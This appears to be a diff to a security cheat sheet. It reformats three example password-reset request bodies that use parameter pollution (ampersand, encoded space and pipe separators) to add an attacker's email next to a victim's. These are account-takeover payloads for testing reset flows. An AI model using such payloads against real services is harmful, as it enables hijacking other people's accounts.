@@ -77,7 +77,7 @@ POST /ResetPassword
 ...
 ...
 
-email=victim@email.com&email=attacker@email.com
+email="victim@email.com&email=attacker@email.com"
 ```
 
 ```bash
@@ -86,7 +86,7 @@ POST /ResetPassword
 ...
 ...
 
-email=victim@email.com%20email=attacker@email.com
+email="victim@email.com%20email=attacker@email.com"
 ```
 
 ```bash
@@ -95,7 +95,7 @@ POST /ResetPassword
 ... 
 ...
 
-email=victim@email.com|email=attacker@email.com 
+email="victim@email.com|email=attacker@email.com" 
 ```
 
 ```bash
